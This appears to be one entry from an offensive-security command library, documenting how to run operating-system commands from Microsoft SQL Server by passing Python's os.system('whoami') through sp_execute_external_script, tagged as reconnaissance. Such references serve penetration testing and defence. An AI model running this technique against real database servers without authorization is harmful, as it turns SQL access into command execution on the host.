---
id: f4ff030f-1d7f-401d-b6e2-93ae483fa82e
name: mssql-xp-cmdshell-whoami-via-os-system
type: command
executor: sql
data: >-
  EXEC sp_execute_external_script @language = N'Python', @script =
  N'print(__import__("os").system("whoami"))';
output: null
created_at: '2023-04-06T03:56:33.953703+00:00'
updated_at: '2023-04-10T20:22:46.090384+00:00'
platforms:
  - Windows
tags:
  - mssql
  - python-execution
  - recon
verified: true
validated: true
---

# mssql-xp-cmdshell-whoami-via-os-system

## Command

```sql
EXEC sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))';
```

## Description

Uses sp_execute_external_script to run Python code that executes 'whoami' via os.system, printing the current Windows user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @script | Python code to execute | Yes |

## Examples

### Basic Usage

Execute in SQL shell.

## Expected Output

User output:

```
DOMAIN\username
```

## Related

- [[procedures/MSSQL-Command-Execution-via-xp-cmdshell]]
